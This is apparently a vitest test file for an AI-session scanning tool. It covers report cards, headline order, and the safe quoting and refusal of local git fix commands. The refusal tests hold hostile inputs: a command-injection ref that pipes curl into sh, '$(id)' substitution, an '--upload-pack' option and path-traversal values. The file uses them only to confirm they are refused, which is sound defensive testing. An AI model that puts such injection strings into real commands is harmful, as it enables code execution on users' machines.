// cspell:words LOCALFIXCANARY FACTSCANARY KINDCANARY VIACANARY FIXCANARY
/**
 * The shapes later checks and the page build on (`core/verify/cards.ts`, `types.ts`): cards,
 * sentences, the headline order, the local-only fix channel, the payload copy of a category's
 * facts, and the switch for verifying by default.
 */

import { describe, expect, it } from "vitest";
import { compileAllowlist } from "../core/evaluate.js";
import { MAX_ROWS, renderJson, renderReport, reportPayload } from "../core/report.js";
import { compileCatalog } from "../core/rules.js";
import { aggregateScan } from "../core/scan-report.js";
import {
  type CardBuilders,
  type CardContext,
  type CardView,
  COULD_NOT_CHECK_SENTENCE,
  cardsFor,
  couldNotCheckCard,
  HEADLINE_BASES,
  HEADLINE_BASIS,
  HEADLINE_ORDER,
  type HeadlineBasis,
  isLocalFix,
  LOCAL_FIX_SERIALIZED,
  type LocalFix,
  localFixCommand,
  NOT_CHECKED_SENTENCE,
  notCheckedCard,
  orderCards,
  pickHeadline,
  type SentenceTemplate,
  sentence,
  sentences,
  TONE_ORDER,
} from "../core/verify/cards.js";
import {
  type CategoriesMissingHidingForms,
  FACT_KEYS,
  FACT_VALUE_ENUMS,
  HIDING_FORMS,
  type HidingForm,
  type HidingFormsRequired,
  type SecretsFacts,
  VERIFY_CATEGORIES,
  VERIFY_STATUSES,
  type Verification,
  type VerifyCategory,
  type VerifyStatus,
} from "../core/verify/types.js";
import { VERIFY_BY_DEFAULT } from "../core/verify/verify.js";
import { RULE_RM_RF } from "./scan-fixtures.js";

/** Secrets facts with every count zero. */
const NO_FACTS: SecretsFacts = {
  classes: { "likely-real": 0, "committed-fixture": 0, placeholder: 0, "local-dev": 0 },
  items: [],
  moreItems: 0,
  filesRead: 1,
  filesNotRead: 0,
  unplaced: 0,
  setAside: { unnamedOutputOnly: 0, namedNotCredentialShaped: 0 },
  fixtureCheck: "not-needed",
  reposChecked: 0,
  reposNotChecked: 0,
};

/** A verification with the secrets result given and every other category not checked. */
function verification(secretsStatus: VerifyStatus = "act", likely = 2): Verification {
  const pending = { status: "not-checked" } as const;
  return {
    matchedCalls: { ran: 0, mentioned: 0, unknown: 0 },
    resultsRecorded: true,
    ranEvidence: "tool-result",
    categories: {
      secrets: {
        status: secretsStatus,
        matches: likely,
        facts: { ...NO_FACTS, classes: { ...NO_FACTS.classes, "likely-real": likely } },
      },
      "skipped-checks": pending,
      "lost-work": pending,
      cloud: pending,
      "prod-infra": pending,
      tests: pending,
      destructive: pending,
      unreviewed: pending,
      egress: pending,
    },
  };
}

/** A template that states the likely-real count. */
const LIKELY: SentenceTemplate<SecretsFacts> = {
  id: "secrets.likely-real",
  render: (f) =>
    f.classes["likely-real"] > 0
      ? `${f.classes["likely-real"]} likely-real credentials.`
      : undefined,
};

/** The builders the tests use: a secrets card only, as the contract requires. */
const BUILDERS: CardBuilders = {
  secrets: (result, context) => ({
    category: "secrets",
    tone: result.status,
    count: result.matches,
    found: sentences([LIKELY], result.facts),
    now: [],
    fixes: [{ shape: "agenttrail-guard scan --scrub" }],
    codexCaveat: context.ranEvidence === "output-record",
    headline: {
      basis: "likely-real-credentials",
      count: result.facts.classes["likely-real"],
      restsOnCodexRan: false,
      sentence: sentence(LIKELY, result.facts) ?? { template: LIKELY.id, text: "" },
    },
  }),
};

describe("sentences come from templates", () => {
  it("names the template a line came from, and skips a template the facts do not support", () => {
    expect(
      sentence(LIKELY, { ...NO_FACTS, classes: { ...NO_FACTS.classes, "likely-real": 3 } }),
    ).toEqual({ template: "secrets.likely-real", text: "3 likely-real credentials." });
    expect(sentence(LIKELY, NO_FACTS)).toBeUndefined();
    expect(sentences([LIKELY, NOT_CHECKED_SENTENCE], NO_FACTS)).toEqual([
      { template: "not-checked", text: "Not checked yet." },
    ]);
  });
});

describe("cards", () => {
  it("a category with no check gets the not-checked card, never a clean one", () => {
    expect(notCheckedCard("egress")).toEqual({
      category: "egress",
      tone: "not-checked",
      count: 0,
      found: [{ template: NOT_CHECKED_SENTENCE.id, text: "Not checked yet." }],
      now: [],
      fixes: [],
      codexCaveat: false,
    });
  });

  it("a check that could not finish gets the could-not-check card", () => {
    const card = couldNotCheckCard("lost-work", 4);
    expect(card.tone).toBe("could-not-check");
    expect(card.count).toBe(4);
    expect(card.found.map((s) => s.template)).toEqual([COULD_NOT_CHECK_SENTENCE.id]);
  });

  it("builds all nine, in page order: act, review, clean, could-not-check, not-checked", () => {
    const cards = cardsFor(verification("act"), BUILDERS);
    expect(cards).toHaveLength(9);
    expect(cards[0]?.category).toBe("secrets");
    expect(cards[0]?.found.map((s) => s.text)).toEqual(["2 likely-real credentials."]);
    expect(cards.slice(1).map((c) => c.category)).toEqual(VERIFY_CATEGORIES.slice(1));
    expect(cards.slice(1).every((c) => c.tone === "not-checked")).toBe(true);
  });

  it("a checked category whose check could not finish gets the default card, not its builder's", () => {
    const [secrets] = cardsFor(verification("could-not-check"), BUILDERS).filter(
      (c) => c.category === "secrets",
    );
    expect(secrets?.tone).toBe("could-not-check");
  });

  it("a result with facts and no builder is shown as could-not-check, never as clean", () => {
    const cards = cardsFor(verification("clean"), {} as CardBuilders);
    expect(cards.find((c) => c.category === "secrets")?.tone).toBe("could-not-check");
  });

  it("passes the Codex evidence to the builder", () => {
    const codex = { ...verification(), ranEvidence: "output-record" as const };
    expect(cardsFor(codex, BUILDERS).find((c) => c.category === "secrets")?.codexCaveat).toBe(true);
  });

  it("orders by tone, then by category", () => {
    const card = (category: VerifyCategory, tone: VerifyStatus): CardView => ({
      ...notCheckedCard(category),
      tone,
    });
    const ordered = orderCards([
      card("egress", "clean"),
      card("tests", "not-checked"),
      card("cloud", "review"),
      card("destructive", "act"),
      card("secrets", "clean"),
      card("lost-work", "could-not-check"),
    ]);
    expect(ordered.map((c) => `${c.tone}:${c.category}`)).toEqual([
      "act:destructive",
      "review:cloud",
      "clean:secrets",
      "clean:egress",
      "could-not-check:lost-work",
      "not-checked:tests",
    ]);
    expect(TONE_ORDER).toEqual(["act", "review", "clean", "could-not-check", "not-checked"]);
  });
});

/** The scan context of a Claude Code, a Codex and a Cursor scan. */
const CLAUDE: CardContext = { ranEvidence: "tool-result" };
const CODEX: CardContext = { ranEvidence: "output-record" };
const CURSOR: CardContext = { ranEvidence: "none" };

/** The tone each leading category leads from. */
const LEAD_TONE = (category: VerifyCategory): VerifyStatus =>
  category === "cloud" ? "review" : "act";

/** The basis a category leads with, or one that leads nowhere for the other three. */
const BASIS_OF = (category: VerifyCategory): HeadlineBasis =>
  (HEADLINE_BASIS as Readonly<Record<string, HeadlineBasis>>)[category] ??
  "likely-real-credentials";

/** A card that claims `count` for the headline, with its category's own basis unless given. */
function claim(
  category: VerifyCategory,
  tone: VerifyStatus = LEAD_TONE(category),
  count = 1,
  restsOnCodexRan = false,
  basis: HeadlineBasis = BASIS_OF(category),
): CardView {
  return {
    ...notCheckedCard(category),
    tone,
    count,
    headline: {
      basis,
      count,
      restsOnCodexRan,
      sentence: { template: `${category}.headline`, text: "x" },
    },
  };
}

describe("the headline", () => {
  it("is in the fixed priority order, each category with one basis", () => {
    expect(HEADLINE_ORDER).toEqual([
      "secrets",
      "skipped-checks",
      "lost-work",
      "cloud",
      "tests",
      "destructive",
    ]);
    expect(HEADLINE_ORDER.map((c) => HEADLINE_BASIS[c])).toEqual([...HEADLINE_BASES]);
  });

  it.each(HEADLINE_ORDER)("%s wins on its own", (category) => {
    expect(pickHeadline([claim(category)], CLAUDE)?.category).toBe(category);
    expect(pickHeadline([claim(category)], CURSOR)?.category).toBe(category);
  });

  it.each(
    HEADLINE_ORDER.flatMap((lower, i) =>
      HEADLINE_ORDER.slice(0, i).map((higher) => [higher, lower] as const),
    ),
  )("%s beats %s", (higher, lower) => {
    expect(pickHeadline([claim(lower), claim(higher)], CLAUDE)?.category).toBe(higher);
  });

  it.each(
    HEADLINE_ORDER,
  )("a clean, not-checked or could-not-check %s is never the headline", (category) => {
    for (const tone of ["clean", "not-checked", "could-not-check"] as const) {
      expect(pickHeadline([claim(category, tone)], CLAUDE)).toBeUndefined();
    }
  });

  it.each(HEADLINE_ORDER)("nothing leads a Codex scan, not even %s", (category) => {
    expect(pickHeadline([claim(category)], CODEX)).toBeUndefined();
    expect(
      pickHeadline(
        HEADLINE_ORDER.map((c) => claim(c, LEAD_TONE(c), 9)),
        CODEX,
      ),
    ).toBeUndefined();
  });

  it("a Codex scan's cards from a builder never lead, while the same cards lead elsewhere", () => {
    const codex = { ...verification("act", 4), ranEvidence: "output-record" as const };
    const cards = cardsFor(codex, BUILDERS);
    expect(cards.find((c) => c.category === "secrets")?.headline?.count).toBe(4);
    expect(pickHeadline(cards, { ranEvidence: codex.ranEvidence })).toBeUndefined();
    expect(pickHeadline(cardsFor(verification("act", 4), BUILDERS), CLAUDE)?.category).toBe(
      "secrets",
    );
  });

  it("cloud leads only from review, and only with the IAM-change count", () => {
    expect(pickHeadline([claim("cloud", "review")], CLAUDE)?.category).toBe("cloud");
    expect(pickHeadline([claim("cloud", "act")], CLAUDE)).toBeUndefined();
    for (const basis of HEADLINE_BASES.filter((b) => b !== "iam-changes")) {
      expect(pickHeadline([claim("cloud", "review", 3, false, basis)], CLAUDE)).toBeUndefined();
    }
  });

  it("no other category leads from review", () => {
    for (const category of HEADLINE_ORDER.filter((c) => c !== "cloud")) {
      expect(pickHeadline([claim(category, "review")], CLAUDE)).toBeUndefined();
    }
  });

  it.each(HEADLINE_ORDER)("a %s claim with another category's basis never leads", (category) => {
    const other = HEADLINE_BASES.find((b) => b !== HEADLINE_BASIS[category]) as HeadlineBasis;
    expect(
      pickHeadline([claim(category, LEAD_TONE(category), 2, false, other)], CLAUDE),
    ).toBeUndefined();
  });

  it.each(
    HEADLINE_ORDER,
  )("a %s claim that rests on Codex ran counts is never the headline", (category) => {
    expect(pickHeadline([claim(category, LEAD_TONE(category), 5, true)], CLAUDE)).toBeUndefined();
  });

  it("a Codex-only claim gives way to a lower one that does not rest on Codex", () => {
    expect(
      pickHeadline(
        [claim("skipped-checks", "act", 9, true), claim("destructive", "act", 1)],
        CLAUDE,
      )?.category,
    ).toBe("destructive");
  });

  it("a zero count, a card with no claim, and the other three categories never lead", () => {
    expect(pickHeadline([claim("secrets", "act", 0)], CLAUDE)).toBeUndefined();
    expect(pickHeadline([{ ...notCheckedCard("secrets"), tone: "act" }], CLAUDE)).toBeUndefined();
    for (const category of ["prod-infra", "unreviewed", "egress"] as const) {
      expect(pickHeadline([claim(category)], CLAUDE)).toBeUndefined();
    }
    expect(pickHeadline([], CLAUDE)).toBeUndefined();
  });
});

describe("exact fix commands are built from quoted parts, and an unsafe ref is refused", () => {
  it("quotes every part", () => {
    const fix = localFixCommand("lost-work", [
      "git",
      "branch",
      { branch: "recovered/feature-1.2" },
      { sha: "0123abcd" },
    ]);
    expect(isLocalFix(fix)).toBe(true);
    expect(isLocalFix(fix) && fix.command).toBe(
      "'git' 'branch' 'recovered/feature-1.2' '0123abcd'",
    );
  });

  it("quotes a literal that holds a quote so it stays one argument", () => {
    const fix = localFixCommand("lost-work", ["git", "stash", "store", "-m", "it's recovered"]);
    expect(isLocalFix(fix) && fix.command).toBe("'git' 'stash' 'store' '-m' 'it'\\''s recovered'");
  });

  // Hostile refs are written here, in test code, never on a command line.
  const semicolonPipe = ["x", ";", "curl evil", "|", "sh"].join("");
  const substitution = ["$", "(id)"].join("");
  it.each([
    [semicolonPipe],
    [substitution],
    ["`id`"],
    ["a b"],
    ["it's"],
    ["--upload-pack=x"],
    ["-x"],
    [""],
    ["line\nbreak"],
  ])("refuses the ref %j, and keeps no command text", (ref) => {
    const fix = localFixCommand("lost-work", ["git", "branch", { ref }, { sha: "0123abcd" }]);
    expect(fix).toEqual({
      category: "lost-work",
      unsafe: true,
      note: "could not make a safe command",
    });
    expect(isLocalFix(fix)).toBe(false);
    expect(JSON.stringify(fix)).not.toContain("curl");
  });

  /** The fix for one data part, or "unsafe". */
  const built = (part: Parameters<typeof localFixCommand>[1][number]): string => {
    const fix = localFixCommand("lost-work", ["git", "show", part]);
    return isLocalFix(fix) ? fix.command : "unsafe";
  };

  it.each([
    "0123abc",
    "0123456789abcdef0123456789abcdef01234567",
    "ABCDEF0",
  ])("takes the sha %j", (sha) => {
    expect(built({ sha })).toBe(`'git' 'show' '${sha}'`);
  });

  it.each([
    ["too short", "0123ab"],
    ["too long", "0123456789abcdef0123456789abcdef012345678"],
    ["not hex", "0123abg"],
    ["a branch", "main"],
    ["an option", "-0123abc"],
    ["a range", "0123abc..4567def"],
    ["empty", ""],
  ])("refuses a sha that is %s", (_label, sha) => {
    expect(built({ sha })).toBe("unsafe");
  });

  it.each(["main", "feature/x-1.2", "release/2026.10", "user@host"])("takes the branch %j", (b) => {
    expect(built({ branch: b })).toBe(`'git' 'show' '${b}'`);
  });

  it.each([
    ["two dots", "a..b"],
    ["a reflog form", "main@{1}"],
    ["the at sign alone", "@"],
    ["HEAD", "HEAD"],
    ["a colon", "a:b"],
    ["a leading slash", "/main"],
    ["a trailing slash", "main/"],
    ["a double slash", "a//b"],
    ["a component starting with a dot", "a/.hidden"],
    ["a leading dot", ".main"],
    ["a lock component", "a/b.lock"],
    ["a trailing dot", "main."],
    ["an option", "--upload-pack=x"],
    ["a space", "a b"],
    ["a tilde", "main~1"],
    ["a caret", "main^"],
    ["a glob", "ma*n"],
    ["a backslash", "a\\b"],
    ["a substitution", ["$", "(id)"].join("")],
    ["empty", ""],
  ])("refuses a branch with %s", (_label, branch) => {
    expect(built({ branch })).toBe("unsafe");
  });

  it.each(["src/a.ts", "a.ts", "docs/notes-1.md", "./a.ts"])("takes the repo path %j", (path) => {
    expect(built({ repoPath: path })).toBe(`'git' 'show' '${path}'`);
  });

  it.each([
    ["absolute", "/etc/hosts"],
    ["climbing out", "../secret"],
    ["climbing out midway", "a/../../b"],
    ["a drive", "C:/x"],
    ["an option", "-rf"],
    ["a space", "a b"],
    ["a home form", "~/x"],
    ["empty", ""],
  ])("refuses a repo path that is %s", (_label, repoPath) => {
    expect(built({ repoPath })).toBe("unsafe");
  });
});

describe("exact fix commands stay in the local channel", () => {
  /** A fix holding the canary, built the only way a fix can be. */
  const canaryFix = (): LocalFix => {
    const fix = localFixCommand("lost-work", [
      "git",
      "branch",
      { branch: "recovered/LOCALFIXCANARY" },
      { sha: "0123abc" },
    ]);
    if (!isLocalFix(fix)) throw new Error("the canary fix was refused");
    return fix;
  };

  it("a local fix refuses to become JSON", () => {
    const fix = canaryFix();
    expect(isLocalFix(fix)).toBe(true);
    expect(isLocalFix({ category: "lost-work", command: fix.command })).toBe(false);
    expect(Object.isFrozen(fix)).toBe(true);
    expect(() => JSON.stringify(fix)).toThrow(LOCAL_FIX_SERIALIZED);
    expect(() => JSON.stringify({ nested: [fix] })).toThrow(LOCAL_FIX_SERIALIZED);
  });

  it("the payload, the page and --json cannot carry one, even placed in a category's facts by mistake", () => {
    const leaked = {
      ...verification(),
      categories: {
        ...verification().categories,
        "lost-work": {
          status: "act",
          matches: 1,
          facts: { items: [canaryFix()] },
        },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      leaked,
    );
    const meta = { version: "0.0.0", generatedAt: new Date(0) };
    expect(() => reportPayload(result, meta)).toThrow(LOCAL_FIX_SERIALIZED);
    expect(() => renderReport(result, meta)).toThrow(LOCAL_FIX_SERIALIZED);
    expect(() => renderJson(result, meta)).toThrow(LOCAL_FIX_SERIALIZED);
  });

  it("under a key facts may not use, one is dropped with the key and never written", () => {
    const dropped = {
      ...verification(),
      categories: {
        ...verification().categories,
        "lost-work": {
          status: "act",
          matches: 1,
          facts: { fixes: [canaryFix()] },
        },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      dropped,
    );
    const meta = { version: "0.0.0", generatedAt: new Date(0) };
    expect(renderReport(result, meta)).not.toContain("LOCALFIXCANARY");
    expect(renderJson(result, meta)).not.toContain("LOCALFIXCANARY");
  });

  it("the raw builder is internal: the module exports only the quoting one", async () => {
    const cards = await import("../core/verify/cards.js");
    expect(Object.keys(cards)).not.toContain("localFix");
    expect(Object.keys(cards)).toContain("localFixCommand");
  });

  it("Verification has no field for them", () => {
    const v: Verification = {
      ...verification(),
      // @ts-expect-error — local fixes travel beside the verification, never inside it.
      localFixes: [],
    };
    expect(v).toBeDefined();
  });
});

describe("a checked category's facts reach the file as plain data", () => {
  const meta = { version: "0.0.0", generatedAt: new Date(0) };

  it("only registered keys and enum strings reach the file and --json; lists are capped in the file", () => {
    class NotPlain {
      readonly x = 1;
    }
    const facts = {
      filesRead: 3,
      fixtureCheck: "partial",
      items: Array.from({ length: MAX_ROWS + 5 }, (_, i) => ({ files: i, kind: "github-token" })),
      classes: { "likely-real": 2, "/Users/FACTSCANARY/.env": 1 },
      kind: "feature/FACTSCANARY-branch",
      via: ["pasted-into-prompt", "/Users/FACTSCANARY/.env"],
      unregistered: 5,
      fn: () => 1,
      map: new Map([["a", 1]]),
      instance: new NotPlain(),
      nothing: null,
    };
    const v = {
      ...verification(),
      categories: { ...verification().categories, tests: { status: "act", matches: 3, facts } },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      v,
    );
    const tests = reportPayload(result, meta).verification?.categories.tests as unknown as {
      status: string;
      matches: number;
      facts: Record<string, unknown>;
    };
    expect(tests.status).toBe("act");
    expect(tests.matches).toBe(3);
    expect(tests.facts).toEqual({
      filesRead: 3,
      fixtureCheck: "partial",
      items: Array.from({ length: MAX_ROWS }, (_, i) => ({ files: i, kind: "github-token" })),
      classes: { "likely-real": 2 },
      via: ["pasted-into-prompt"],
    });
    const json = JSON.parse(renderJson(result, meta)).result.verification.categories.tests.facts;
    expect(json.items).toHaveLength(MAX_ROWS + 5);
    expect(json.kind).toBeUndefined();
    expect(json.via).toEqual(["pasted-into-prompt"]);
    for (const surface of [renderReport(result, meta), renderJson(result, meta)]) {
      expect(surface).not.toContain("FACTSCANARY");
    }
  });

  it("a category's hiding forms pass as an enum list, and anything else in it is dropped", () => {
    expect(FACT_VALUE_ENUMS).toContain(HIDING_FORMS);
    expect(FACT_KEYS).toContain("hidingForms");
    const facts = {
      hidingForms: ["xargs", "bash -c FACTSCANARY", "git-hook"],
      byForm: { "shell-string": 2 },
    };
    const v = {
      ...verification(),
      categories: {
        ...verification().categories,
        "lost-work": { status: "could-not-check", matches: 2, facts },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      v,
    );
    const copied = reportPayload(result, meta).verification?.categories["lost-work"] as unknown as {
      facts: unknown;
    };
    expect(copied.facts).toEqual({ hidingForms: ["xargs", "git-hook"] });
    expect(renderJson(result, meta)).not.toContain("FACTSCANARY");
  });

  it("negative control — the same strings are in the facts given", () => {
    expect(JSON.stringify({ kind: "feature/FACTSCANARY-branch" })).toContain("FACTSCANARY");
  });

  it("deep facts are cut at the depth cap", () => {
    const deep = {
      classes: {
        classes: { classes: { classes: { classes: { classes: { classes: { filesRead: 1 } } } } } },
      },
    };
    const v = {
      ...verification(),
      categories: {
        ...verification().categories,
        tests: { status: "clean", matches: 0, facts: deep },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      v,
    );
    const facts = (
      reportPayload(result, meta).verification?.categories.tests as unknown as {
        facts: unknown;
      }
    ).facts;
    expect(JSON.stringify(facts)).toBe(
      '{"classes":{"classes":{"classes":{"classes":{"classes":{}}}}}}',
    );
  });

  it("every category's facts but secrets' must carry hidingForms, or the contract does not compile", () => {
    type Good = CategoriesMissingHidingForms<{
      secrets: SecretsFacts;
      "lost-work": { readonly hidingForms: readonly HidingForm[]; readonly branches: number };
    }>;
    type Bad = CategoriesMissingHidingForms<{
      secrets: SecretsFacts;
      "lost-work": { readonly branches: number };
      destructive: { readonly hidingForms: readonly HidingForm[] };
    }>;
    const good: [Good] extends [never] ? true : false = true;
    const bad: Bad = "lost-work";
    // @ts-expect-error: a category that has hidingForms is not listed as missing it.
    const notListed: Bad = "destructive";
    // The contract's own map passes today; `HidingFormsRequired` holds only `true`.
    const required: HidingFormsRequired = true;
    expect([good, bad, notListed, required]).toEqual([true, "lost-work", "destructive", true]);
  });

  it("the secrets block in the file checks its strings against the enums, as --json does", () => {
    const v = verification("act", 1);
    const stray = {
      ...v,
      categories: {
        ...v.categories,
        secrets: {
          ...v.categories.secrets,
          facts: {
            ...v.categories.secrets.facts,
            items: [
              { kind: "KINDCANARY-kind", via: ["pasted-into-prompt", "VIACANARY-way"], files: 1 },
            ],
            fixtureCheck: "FIXCANARY-check",
          },
        },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      stray,
    );
    const secrets = reportPayload(result, meta).verification?.categories.secrets;
    expect(secrets?.facts.items).toEqual([
      { kind: "other", via: ["pasted-into-prompt"], files: 1 },
    ]);
    expect(secrets?.facts.fixtureCheck).toBe("unavailable");
    const json = JSON.parse(renderJson(result, meta)).result.verification.categories.secrets;
    expect(json.facts.items).toEqual([{ via: ["pasted-into-prompt"], files: 1 }]);
    expect(json.facts.fixtureCheck).toBeUndefined();
    for (const surface of [renderReport(result, meta), renderJson(result, meta)]) {
      expect(surface).not.toMatch(/KINDCANARY|VIACANARY|FIXCANARY/);
    }
    // Negative control: the strings were in what the check handed over.
    expect(JSON.stringify(stray)).toMatch(/KINDCANARY.*VIACANARY.*FIXCANARY/);
  });

  it("the secrets facts in --json pass the same boundary, uncapped", () => {
    const many = Array.from({ length: MAX_ROWS + 3 }, () => ({
      kind: "github-token" as const,
      via: ["pasted-into-prompt" as const],
      files: 1,
    }));
    const v = verification("act", 2);
    const withItems = {
      ...v,
      categories: {
        ...v.categories,
        secrets: { ...v.categories.secrets, facts: { ...v.categories.secrets.facts, items: many } },
      },
    };
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      withItems,
    );
    const json = JSON.parse(renderJson(result, meta)).result.verification.categories.secrets;
    expect(json.facts.items).toHaveLength(MAX_ROWS + 3);
    expect(json.facts.setAside).toEqual({ unnamedOutputOnly: 0, namedNotCredentialShaped: 0 });
  });

  it("a could-not-check result with a count and no facts keeps its count, in the file and on the card", () => {
    const v = {
      ...verification(),
      categories: {
        ...verification().categories,
        "lost-work": { status: "could-not-check", matches: 4 },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      v,
    );
    expect(reportPayload(result, meta).verification?.categories["lost-work"]).toEqual({
      status: "could-not-check",
      matches: 4,
    });
    const card = cardsFor(v, BUILDERS).find((c) => c.category === "lost-work");
    expect(card?.tone).toBe("could-not-check");
    expect(card?.count).toBe(4);
  });

  it("a checked result keeps its count and facts together", () => {
    const v = {
      ...verification(),
      categories: {
        ...verification().categories,
        tests: { status: "clean", matches: 0, facts: { filesRead: 0 } },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      v,
    );
    expect(reportPayload(result, meta).verification?.categories.tests).toEqual({
      status: "clean",
      matches: 0,
      facts: { filesRead: 0 },
    });
  });

  it.each([
    ["an unknown word", "FACTSCANARY-status"],
    ["a status-like word", "passed"],
    ["a number", 3],
    ["nothing", undefined],
  ])("a status that is not one of the contract's becomes could-not-check: %s", (_l, status) => {
    const v = {
      ...verification(),
      categories: {
        ...verification().categories,
        secrets: { ...verification().categories.secrets, status },
        tests: { status, matches: 2, facts: { filesRead: 1 } },
      },
    } as unknown as Verification;
    const result = aggregateScan(
      { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
      compileCatalog([RULE_RM_RF]),
      compileAllowlist([]),
      new Set(),
      v,
    );
    const file = reportPayload(result, meta).verification;
    const json = JSON.parse(renderJson(result, meta)).result.verification;
    for (const copied of [file, json]) {
      expect(copied?.categories.tests).toEqual({
        status: "could-not-check",
        matches: 2,
        facts: { filesRead: 1 },
      });
      expect(copied?.categories.secrets.status).toBe("could-not-check");
    }
    expect(renderReport(result, meta)).not.toContain("FACTSCANARY");
  });

  it("every status of the contract passes as it is", () => {
    for (const status of VERIFY_STATUSES) {
      const v = {
        ...verification(),
        categories: { ...verification().categories, tests: { status, matches: 0, facts: {} } },
      } as unknown as Verification;
      const result = aggregateScan(
        { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
        compileCatalog([RULE_RM_RF]),
        compileAllowlist([]),
        new Set(),
        v,
      );
      expect(reportPayload(result, meta).verification?.categories.tests.status).toBe(status);
    }
  });

  it("a category with no check stays status only", () => {
    const payload = reportPayload(
      aggregateScan(
        { sessions: [], quarantined: 0, notRead: 0, projects: 0 },
        compileCatalog([RULE_RM_RF]),
        compileAllowlist([]),
        new Set(),
        verification(),
      ),
      meta,
    );
    expect(payload.verification?.categories.egress).toEqual({ status: "not-checked" });
  });
});

describe("verifying by default", () => {
  it("is off until the one switch is flipped", () => {
    expect(VERIFY_BY_DEFAULT).toBe(false);
  });
});
